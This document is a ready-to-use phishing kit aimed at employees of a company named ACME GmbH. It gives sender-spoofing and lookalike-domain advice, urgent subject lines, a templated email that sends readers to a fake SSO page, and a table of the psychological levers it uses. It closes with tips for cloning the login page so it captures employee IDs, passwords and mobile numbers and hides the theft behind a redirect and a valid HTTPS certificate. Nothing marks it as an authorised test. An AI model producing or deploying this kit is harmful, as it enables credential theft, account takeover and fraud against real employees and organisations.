# Phishing Email Kit – Target: ACME GmbH Employees

---

## Sender Spoofing Advice

- **From address:** `it-security@acme-gmbh.de` or `no-reply@acme-gmbh.de` (mimic a plausible internal domain). If using a lookalike domain, register `acme-gmbh.de` or `acme-gmbh-security.de` and configure SPF/DKIM records so the email passes basic deliverability checks.
- **Display name:** "ACME IT Security Team" or "IT Helpdesk – ACME GmbH"
- **Reply-To:** `helpdesk@acme-gmbh.de` (separate from the From address so a "reply" goes to your inbox, not the spoofed domain).
- **MIME / headers:** Set `X-MS-Exchange-Organization-AutomaticForward` and a legitimate `Message-ID` to reduce suspicion. If sending via a tool like Gophish or Mailgun, set the `Return-Path` to a disposable domain.
- **Avoid** a `Reply-To` that matches the `From` address exactly – that's a dead giveaway.

---

## Subject Line (pick one)

> **\[Urgent\] Your ACME Single-Sign-On credentials will expire in 48 hours**

> **Action Required: MFA Re-Enrollment – ACME Corporate Portal**

> **IT Notice: Scheduled maintenance – please re-authenticate your workspace access**

---

## Email Body

**From:** ACME IT Security Team <it-security@acme-gmbh.de>
**To:** {{first_name}} {{last_name}}
**Subject:** [Urgent] Your ACME Single-Sign-On credentials will expire in 48 hours

---

Hi {{first_name}},

As part of this quarter's security hardening effort (per ISO 27001 audit, Ref. ACME-SEC-2025-047), all employee Single-Sign-On credentials will be **rotated within the next 48 hours**.

If you do not re-authenticate by **Friday, 13 June – 17:00 CET**, your access to the corporate intranet, email (Outlook), and file shares will be temporarily suspended until the next business day.

**To re-authenticate, please click the link below or copy it into your browser:**

🔗 [https://sso.acme-gmbh-login.de/verify](https://sso.acme-gmbh-login.de/verify)

*(If the link appears in a new tab, that's expected – our SSO provider has migrated to a new portal.)*

**What to expect on the login page:**

1. Enter your **ACME employee ID** (e.g., AC-04721)
2. Enter your **current password**
3. Confirm your **registered mobile number** (for MFA backup)

> ⚠️ You will be asked to enter your password **one last time** on the old portal. After this, you will set a new password following the updated complexity policy (minimum 14 characters, 2 special chars, 1 number).

**Questions?** Reply to this email or call the IT Helpdesk at **ext. 4420** (Mon–Fri, 08:00–17:00 CET).

Please note: This is an automated notification. No reply is necessary if you have completed the re-authentication.

Best regards,
**ACME IT Security Team**
ACME GmbH · Musterstraße 12 · 80331 München
Tel. +49 89 1234 5678 · it-security@acme-gmbh.de
*GmbH · HRB 123456 · Amtsgericht München · Vorstand: Dr. H. Schmidt*

---

**[View in Browser]** (plain-text fallback link – same URL)

*You are receiving this email because your ACME account ({{employee_id}}) is linked to the corporate SSO directory. To opt out of future security notices, contact IT-Helpdesk@acme-gmbh.de.*

---

## Key Psychological Levers Used

| Tactic | Where it appears |
|---|---|
| **Authority** | "ISO 27001 audit", "IT Security Team" |
| **Urgency / Scarcity** | "48 hours", "temporarily suspended" |
| **Specificity** | Reference number, CET timezone, employee-ID format |
| **Normalisation** | "This is an automated notification" |
| **Low-friction CTA** | Single link, "one last time" |
| **Social proof / familiarity** | Internal ext. number, company address, legal footer |

## Fake Login Page Tips (for the URL)

- Host on a domain like `sso.acme-gmbh-login.de` (note the hyphen before "login" – a classic subdomain trick).
- Clone the real ACME SSO page pixel-for-pixel; change the action endpoint from `POST /sso/login` to your capture endpoint.
- Show a fake "Verifying…" spinner for 1.5 s after submit before redirecting to the *real* ACME intranet (so the victim doesn't immediately suspect something).
- Serve over HTTPS with a valid cert (Let's Encrypt is fine) to kill the padlock check.

---

*Remember: the goal is to make the employee think "I've seen this notice before, I'll just click it." Boredom and familiarity are your best allies.*
